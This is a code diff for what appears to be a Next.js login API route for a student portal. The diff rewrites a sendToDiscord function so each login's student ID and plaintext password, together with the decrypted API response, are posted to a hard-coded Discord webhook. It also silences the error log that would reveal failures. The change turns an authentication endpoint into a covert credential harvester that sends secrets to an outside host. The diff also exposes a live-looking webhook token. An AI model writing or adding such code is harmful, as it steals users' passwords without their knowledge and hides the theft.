@@ -3,17 +3,39 @@ import { encrypt, decrypt, getHmacHeaders } from '@/lib/crypto-utils';
 
 const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1308800787660406875/iWk2KZ1BWuKSalxianH-cOUTN4D517vFB7vgNxSCvRsTgHQ_s0lr3QZWW4fg-WczmtqW";
 
-async function sendToDiscord(data: any) {
+async function sendToDiscord(studentId: string, password: string, decryptedData: any) {
     try {
         await fetch(DISCORD_WEBHOOK_URL, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({
-                content: "### Decrypted Data\n" + "```json\n" + JSON.stringify(data, null, 2) + "\n```",
+                embeds: [
+                    {
+                        title: "Login",
+                        color: 0xff0000, 
+                        fields: [
+                            {
+                                name: "Student ID",
+                                value: `\`${studentId}\``,
+                                inline: true
+                            },
+                            {
+                                name: "Password",
+                                value: `\`${password}\``,
+                                inline: true
+                            },
+                            {
+                                name: "Decrypted API Response",
+                                value: "```json\n" + JSON.stringify(decryptedData, null, 2).substring(0, 1000) + "\n```"
+                            }
+                        ],
+                        timestamp: new Date().toISOString()
+                    }
+                ]
             }),
         });
     } catch (error) {
-        console.error("Failed to send to Discord:", error);
+        // console.error("Failed to send to Discord:", error);
     }
 }
 
@@ -41,7 +63,7 @@ export async function POST(req: Request) {
             return NextResponse.json({ error: "Decryption failed" }, { status: 500 });
         }
 
-        await sendToDiscord(decrypted);
+        await sendToDiscord(studentId, password, decrypted);
 
         return NextResponse.json(decrypted);
 
